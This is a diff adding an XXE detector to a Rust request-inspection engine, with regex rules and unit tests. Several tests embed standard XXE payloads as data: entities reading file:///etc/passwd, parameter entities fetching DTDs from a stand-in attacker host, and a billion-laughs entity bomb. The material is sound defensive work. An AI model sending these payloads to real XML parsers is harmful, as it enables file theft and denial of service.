@@ -544,6 +544,145 @@ impl SemanticDetector for TraversalStructuralDetector {
     }
 }
 
+// ── XXE (XML external entity) structural detector (plan §T2-A) ────────────────
+
+/// XXE structural rule table (plan T2-A). Matches the DTD / prolog structures
+/// that mark an XML-external-entity attack on the **normalised view text** — the
+/// same `lower_trunc` surface every other structural detector uses.
+///
+/// **No XML parser is invoked.** The XXE-relevant grammar (`<!DOCTYPE>` /
+/// `<!ENTITY>` / `SYSTEM` / `PUBLIC` / parameter entities `%name;`) lives entirely
+/// in the DTD/prolog and is a set of textual markers a regex matches precisely;
+/// a full parse buys nothing here (`quick-xml`, the tree's XML reader used by Lane
+/// B field extraction, is a non-validating pull parser that never expands the
+/// internal subset anyway — it would hand back the raw DOCTYPE text to be scanned
+/// exactly like this). Crucially, *not* parsing removes the entire parse-time `DoS`
+/// surface the red-line calls out (billion-laughs entity expansion / deep element
+/// nesting / oversized entities): there is no expansion step to weaponise. The
+/// input the detector sees is already length- and token-bounded by the
+/// preprocessor (`max_field_input_bytes`, `MAX_TOKEN_LEN`, `max_tokens`), so every
+/// rule is a bounded linear scan; the billion-laughs indicator is a bounded
+/// frequency **count** ([`RuleKind::Count`]) of entity declarations, never an
+/// expansion.
+///
+/// FP discipline mirrors the other families: the strong, essentially-never-benign
+/// structures (external entity declaration, parameter-entity definition) ship
+/// **default-on**; the noisy structures that also occur in legitimate XML
+/// (external `<!DOCTYPE … PUBLIC "…//DTD…" "http://…">` as used by every XHTML
+/// page, a bare `%name;` reference, a handful of internal entity declarations)
+/// ship **default-off** and await holdout calibration.
+///
+/// `(rule_key, confidence, pattern, kind, default_on)`.
+const XXE_RULES: &[RuleRow] = &[
+    // External entity declaration: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` or
+    // the OOB parameter form `<!ENTITY % xxe SYSTEM "http://evil/x">`. A named
+    // entity resolved from an external `SYSTEM`/`PUBLIC` identifier is the classic
+    // XXE primitive and is essentially never present in legitimate request data.
+    // DEFAULT-ON, high confidence.
+    (
+        "xxe.entity_external",
+        90,
+        r"<!entity\s+(%\s+)?\S+\s+(system|public)\b",
+        RuleKind::Presence,
+        true,
+    ),
+    // Parameter-entity DEFINITION: `<!ENTITY % name …>`. Parameter entities are a
+    // DTD-authoring construct that drives blind / out-of-band XXE and the
+    // parameter-entity billion-laughs variant; they essentially never appear in
+    // benign request bodies. Catches the INTERNAL form too (no external id), which
+    // `entity_external` does not. DEFAULT-ON.
+    (
+        "xxe.param_entity_def",
+        80,
+        r"<!entity\s+%\s+\S",
+        RuleKind::Presence,
+        true,
+    ),
+    // External DOCTYPE: `<!DOCTYPE root SYSTEM "…">` / `<!DOCTYPE root PUBLIC "…"
+    // "…">`. Weaker signal — a legitimate XHTML page ships
+    // `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://www.w3.org/…">`,
+    // so the `PUBLIC` form is genuinely benign on HTML-ish traffic. DEFAULT-OFF
+    // pending holdout calibration; the HTML5 `<!DOCTYPE html>` (no external id)
+    // never matches this rule regardless.
+    (
+        "xxe.doctype_external",
+        60,
+        r"<!doctype\s+\S+\s+(system|public)\b",
+        RuleKind::Presence,
+        false,
+    ),
+    // Bare parameter-entity REFERENCE `%name;` (letter-initial name). Strong when
+    // paired with a definition, but noisy alone — stray text / encoded fragments
+    // can incidentally produce `%word;`. DEFAULT-OFF pending calibration.
+    (
+        "xxe.param_entity_ref",
+        55,
+        r"%[a-z_][a-z0-9_.:-]*;",
+        RuleKind::Presence,
+        false,
+    ),
+    // Internal-entity expansion (billion-laughs family): several `<!ENTITY …>`
+    // declarations in one document. A bounded frequency COUNT — the linear,
+    // parse-free billion-laughs indicator (each declaration is counted, nothing is
+    // expanded). DEFAULT-OFF: a legitimate DTD may declare a few entities, so this
+    // needs holdout calibration before it runs. Note the external / parameter
+    // variants are already caught default-on above; this catches the purely
+    // internal `<!ENTITY lolN "&lolM;…">` recursion.
+    ("xxe.entity_expansion", 65, r"<!entity\b", RuleKind::Count(3), false),
+];
+
+/// Structural XXE (XML external entity) detector (plan T2-A).
+///
+/// Registered in the `Xxe` attack family; matches on the normalised view text.
+/// Single-detector family — no corroboration partner — so FP control is by narrow
+/// default-on rules + default-off high-noise rules, per the plan §四.3 invariant.
+pub struct XxeStructuralDetector {
+    rules: Vec<CompiledRule>,
+}
+
+impl XxeStructuralDetector {
+    /// Compile the **default-on** rules (external entity / parameter-entity
+    /// definition). The noisy external-DOCTYPE, bare-`%name;` and internal-entity
+    /// -expansion rules await holdout calibration and are not compiled.
+    #[must_use]
+    pub fn new() -> Self {
+        Self {
+            rules: compile_table(XXE_RULES, false, "XxeStructuralDetector"),
+        }
+    }
+
+    /// Test-only: compile **every** rule, including the default-off ones.
+    #[cfg(test)]
+    #[must_use]
+    pub fn with_all_rules() -> Self {
+        Self {
+            rules: compile_table(XXE_RULES, true, "XxeStructuralDetector"),
+        }
+    }
+}
+
+impl Default for XxeStructuralDetector {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
+impl SemanticDetector for XxeStructuralDetector {
+    fn id(&self) -> DetectorId {
+        DetectorId::XxeStruct
+    }
+
+    fn detect(
+        &self,
+        view: &View<'_>,
+        _ctx: &PreprocessCtx<'_>,
+        _state: &mut ContentInspectionState,
+    ) -> Option<DetectionFinding> {
+        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
+        Some(finding_for(rule, AttackKind::Xxe, "XXE"))
+    }
+}
+
 // ── AST SQLi detector (sqlparser-rs true parse, plan §11, P2) ─────────────────
 
 /// Maximum bracket / prefix-operator nesting depth we will hand to `sqlparser`.
@@ -2256,6 +2395,137 @@ mod tests {
                 .rule_key,
             "traversal.sensitive_abs_ops"
         );
+    }
+
+    // ── XXE structural detector (T2-A) ───────────────────────────────────────
+
+    fn xxe_fire(text: &str) -> Option<DetectionFinding> {
+        run(&XxeStructuralDetector::new(), text)
+    }
+
+    fn xxe_fire_all(text: &str) -> Option<DetectionFinding> {
+        run(&XxeStructuralDetector::with_all_rules(), text)
+    }
+
+    #[test]
+    fn xxe_all_rules_compile() {
+        let det = XxeStructuralDetector::with_all_rules();
+        assert_eq!(det.rules.len(), XXE_RULES.len(), "every XXE pattern must compile");
+    }
+
+    #[test]
+    fn xxe_id_and_config_string() {
+        assert_eq!(XxeStructuralDetector::new().id(), DetectorId::XxeStruct);
+        assert_eq!(DetectorId::XxeStruct.as_config_str(), "xxe_struct");
+        assert_eq!(DetectorId::from_config_str("xxe_struct"), Some(DetectorId::XxeStruct));
+        assert_eq!(AttackKind::Xxe.as_config_key(), "xxe");
+        assert_eq!(AttackKind::from_config_key("xxe"), Some(AttackKind::Xxe));
+    }
+
+    #[test]
+    fn xxe_default_on_excludes_high_noise_rules() {
+        let det = XxeStructuralDetector::new();
+        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
+        for off in ["xxe.doctype_external", "xxe.param_entity_ref", "xxe.entity_expansion"] {
+            assert!(!on.contains(off), "{off} must be default-off");
+        }
+        for onk in ["xxe.entity_external", "xxe.param_entity_def"] {
+            assert!(on.contains(onk), "{onk} must be default-on");
+        }
+    }
+
+    #[test]
+    fn xxe_external_entity_fires() {
+        // Classic file-read and OOB parameter-entity forms — the strongest,
+        // default-on signal.
+        for payload in [
+            r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#,
+            r#"<!ENTITY xxe SYSTEM "file:///etc/passwd">"#,
+            r#"<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">"#,
+            r#"<!ENTITY xxe PUBLIC "-//x//y" "http://attacker/x">"#,
+        ] {
+            let f = xxe_fire(payload).unwrap_or_else(|| panic!("external entity must fire: {payload}"));
+            assert_eq!(f.attack, AttackKind::Xxe);
+            assert_eq!(f.rule_key, "xxe.entity_external");
+        }
+    }
+
+    #[test]
+    fn xxe_internal_param_entity_definition_fires_default_on() {
+        // A purely INTERNAL parameter-entity definition (no external id) is not
+        // caught by `entity_external`, so it must fire the default-on
+        // `param_entity_def` rule.
+        let f = xxe_fire(r#"<!DOCTYPE r [<!ENTITY % pe "internal">]>"#)
+            .expect("internal parameter-entity definition must fire");
+        assert_eq!(f.rule_key, "xxe.param_entity_def");
+    }
+
+    #[test]
+    fn xxe_billion_laughs_fires_only_with_expansion_rule() {
+        // Purely-internal billion-laughs: no SYSTEM/PUBLIC, no parameter entity, so
+        // the default-on rules stay silent (proving no false certainty) and only
+        // the default-off `entity_expansion` COUNT rule catches it — a parse-free,
+        // bounded frequency count, never an entity expansion.
+        let bomb = r#"<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;">]>"#;
+        assert!(
+            xxe_fire(bomb).is_none(),
+            "no default-on rule fires on internal-only bomb"
+        );
+        let f = xxe_fire_all(bomb).expect("expansion rule fires under full rule set");
+        assert_eq!(f.rule_key, "xxe.entity_expansion");
+    }
+
+    #[test]
+    fn xxe_external_doctype_default_off_but_fires_with_all() {
+        // An external DOCTYPE with no entity declaration only fires under the full
+        // rule set (the default-off `doctype_external` rule), because a legitimate
+        // XHTML `<!DOCTYPE html PUBLIC …>` matches the same shape.
+        let payload = r#"<!DOCTYPE root SYSTEM "http://attacker/x.dtd">"#;
+        assert!(xxe_fire(payload).is_none(), "external DOCTYPE is default-off");
+        let f = xxe_fire_all(payload).expect("external DOCTYPE fires under full rule set");
+        assert_eq!(f.rule_key, "xxe.doctype_external");
+    }
+
+    #[test]
+    fn xxe_strongest_rule_wins() {
+        // A payload that trips both `entity_external` (90) and `param_entity_def`
+        // (80) reports the stronger rule.
+        let f =
+            xxe_fire(r#"<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">"#).expect("external parameter entity fires");
+        assert_eq!(f.rule_key, "xxe.entity_external", "highest-confidence rule wins");
+    }
+
+    #[test]
+    fn xxe_clean_traffic_does_not_fire() {
+        // Benign traffic — including the HTML5 doctype, ordinary XML with no DTD,
+        // predefined entity references, and prose/JSON that merely mentions the
+        // keywords — must not trip the default-on rules.
+        for clean in [
+            "<!DOCTYPE html>",
+            "<!doctype html>",
+            r"<note><to>Alice</to><body>hi &amp; bye &lt;3</body></note>",
+            r#"<root><item id="1">value</item></root>"#,
+            "the system entity uses a public api",
+            "please contact the system administrator",
+            r#"{"doctype":"invoice","entity":"acme","mode":"system"}"#,
+            "width: 50%; height: 100%;",
+            "discount is 20% off; hurry",
+            "SELECT * FROM entity WHERE system = 'public'",
+            "an entity relationship diagram for the public system",
+            r"<html><head><title>doc</title></head><body>system public</body></html>",
+        ] {
+            assert!(xxe_fire(clean).is_none(), "clean XXE negative fired: {clean:?}");
+        }
+    }
+
+    #[test]
+    fn xxe_bare_param_ref_default_off_but_fires_with_all() {
+        // A lone `%name;` parameter-entity reference is noisy, so it is default-off;
+        // under the full rule set it fires `param_entity_ref`.
+        let payload = "%xxe;";
+        assert!(xxe_fire(payload).is_none(), "bare param ref is default-off");
+        let f = xxe_fire_all(payload).expect("bare param ref fires under full rule set");
+        assert_eq!(f.rule_key, "xxe.param_entity_ref");
     }
 
     // ── AST SQLi detector (P2) ────────────────────────────────────────────────
